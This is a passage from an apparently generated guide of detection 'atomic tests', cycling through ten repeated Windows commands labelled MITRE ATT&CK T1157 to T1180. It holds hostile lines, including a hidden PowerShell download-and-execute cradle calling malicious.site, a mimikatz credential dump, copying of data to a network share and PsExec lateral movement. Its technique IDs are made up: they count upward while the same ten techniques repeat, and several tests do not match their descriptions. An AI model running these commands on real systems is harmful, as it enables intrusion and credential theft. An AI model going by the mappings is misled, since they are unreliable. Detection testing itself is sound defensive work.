### Atomic Test
```cmd
copy C:\Users\Public\Documents\*.docx D:\Staged\\
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of staging files for exfiltration on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1157**


## ✅ T1158 – Beaconing to external command servers

### Description
Simulates beaconing to external command servers to evaluate detection capability for MITRE tactic **Command and Control**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/c2.ps1\')"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of beaconing to external command servers on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1158**


## ✅ T1159 – Copying data to removable media or network

### Description
Simulates copying data to removable media or network to evaluate detection capability for MITRE tactic **Exfiltration**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell -c "Get-Content C:\data.txt | Out-File \\10.10.10.10\share\data.txt"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of copying data to removable media or network on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1159**


## ✅ T1160 – Malicious script execution using renamed tools

### Description
Simulates malicious script execution using renamed tools to evaluate detection capability for MITRE tactic **Execution**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -Command "Start-Process notepad.exe"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of malicious script execution using renamed tools on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1160**


## ✅ T1161 – Creation of scheduled tasks or services

### Description
Simulates creation of scheduled tasks or services to evaluate detection capability for MITRE tactic **Persistence**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc minute /mo 1
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of creation of scheduled tasks or services on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1161**


## ✅ T1162 – Exploiting system utilities for higher privileges

### Description
Simulates exploiting system utilities for higher privileges to evaluate detection capability for MITRE tactic **Privilege Escalation**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami /priv
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of exploiting system utilities for higher privileges on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1162**


## ✅ T1163 – Masking command execution with obfuscation

### Description
Simulates masking command execution with obfuscation to evaluate detection capability for MITRE tactic **Defense Evasion**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -EncodedCommand aQBlAHgA
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of masking command execution with obfuscation on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1163**


## ✅ T1164 – Harvesting login credentials from memory

### Description
Simulates harvesting login credentials from memory to evaluate detection capability for MITRE tactic **Credential Access**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of harvesting login credentials from memory on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1164**


## ✅ T1165 – System or network enumeration commands

### Description
Simulates system or network enumeration commands to evaluate detection capability for MITRE tactic **Discovery**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
net view && net user
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of system or network enumeration commands on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1165**


## ✅ T1166 – Remote service usage for movement

### Description
Simulates remote service usage for movement to evaluate detection capability for MITRE tactic **Lateral Movement**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
PsExec.exe \\target cmd.exe
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of remote service usage for movement on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1166**


## ✅ T1167 – Staging files for exfiltration

### Description
Simulates staging files for exfiltration to evaluate detection capability for MITRE tactic **Collection**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
copy C:\Users\Public\Documents\*.docx D:\Staged\\
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of staging files for exfiltration on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1167**


## ✅ T1168 – Beaconing to external command servers

### Description
Simulates beaconing to external command servers to evaluate detection capability for MITRE tactic **Command and Control**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/c2.ps1\')"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of beaconing to external command servers on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1168**


## ✅ T1169 – Copying data to removable media or network

### Description
Simulates copying data to removable media or network to evaluate detection capability for MITRE tactic **Exfiltration**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell -c "Get-Content C:\data.txt | Out-File \\10.10.10.10\share\data.txt"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of copying data to removable media or network on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1169**


## ✅ T1170 – Malicious script execution using renamed tools

### Description
Simulates malicious script execution using renamed tools to evaluate detection capability for MITRE tactic **Execution**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -Command "Start-Process notepad.exe"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of malicious script execution using renamed tools on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1170**


## ✅ T1171 – Creation of scheduled tasks or services

### Description
Simulates creation of scheduled tasks or services to evaluate detection capability for MITRE tactic **Persistence**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc minute /mo 1
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of creation of scheduled tasks or services on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1171**


## ✅ T1172 – Exploiting system utilities for higher privileges

### Description
Simulates exploiting system utilities for higher privileges to evaluate detection capability for MITRE tactic **Privilege Escalation**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami /priv
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of exploiting system utilities for higher privileges on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1172**


## ✅ T1173 – Masking command execution with obfuscation

### Description
Simulates masking command execution with obfuscation to evaluate detection capability for MITRE tactic **Defense Evasion**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -EncodedCommand aQBlAHgA
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of masking command execution with obfuscation on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1173**


## ✅ T1174 – Harvesting login credentials from memory

### Description
Simulates harvesting login credentials from memory to evaluate detection capability for MITRE tactic **Credential Access**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of harvesting login credentials from memory on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1174**


## ✅ T1175 – System or network enumeration commands

### Description
Simulates system or network enumeration commands to evaluate detection capability for MITRE tactic **Discovery**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
net view && net user
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of system or network enumeration commands on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1175**


## ✅ T1176 – Remote service usage for movement

### Description
Simulates remote service usage for movement to evaluate detection capability for MITRE tactic **Lateral Movement**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
PsExec.exe \\target cmd.exe
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of remote service usage for movement on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1176**


## ✅ T1177 – Staging files for exfiltration

### Description
Simulates staging files for exfiltration to evaluate detection capability for MITRE tactic **Collection**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
copy C:\Users\Public\Documents\*.docx D:\Staged\\
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of staging files for exfiltration on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1177**


## ✅ T1178 – Beaconing to external command servers

### Description
Simulates beaconing to external command servers to evaluate detection capability for MITRE tactic **Command and Control**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/c2.ps1\')"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of beaconing to external command servers on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1178**


## ✅ T1179 – Copying data to removable media or network

### Description
Simulates copying data to removable media or network to evaluate detection capability for MITRE tactic **Exfiltration**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell -c "Get-Content C:\data.txt | Out-File \\10.10.10.10\share\data.txt"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of copying data to removable media or network on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1179**


## ✅ T1180 – Malicious script execution using renamed tools

### Description
Simulates malicious script execution using renamed tools to evaluate detection capability for MITRE tactic **Execution**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -Command "Start-Process notepad.exe"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of malicious script execution using renamed tools on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1180**